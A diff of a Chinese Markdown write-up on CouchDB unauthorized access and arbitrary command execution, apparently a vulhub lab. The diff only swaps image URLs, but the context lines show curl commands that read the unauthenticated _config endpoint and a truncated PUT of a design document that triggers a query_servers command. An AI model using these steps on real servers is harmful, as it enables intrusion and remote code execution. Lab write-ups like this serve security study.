@@ -34,7 +34,7 @@ curl http://192.168.0.100:5984
 curl http://192.168.0.100:5984/_config
 ```
 
-<img src="https://image.geoer.cn/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE1.png"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE1.png"></img>
 
 ###### 任意命令执行漏洞
 
@@ -69,7 +69,7 @@ curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{"_id":"_d
 #增加_view的同时即触发了query_servers中的命令。
 ```
 
-<img src="https://image.geoer.cn/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE2.png"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE2.png"></img>
 
 exp地址
 
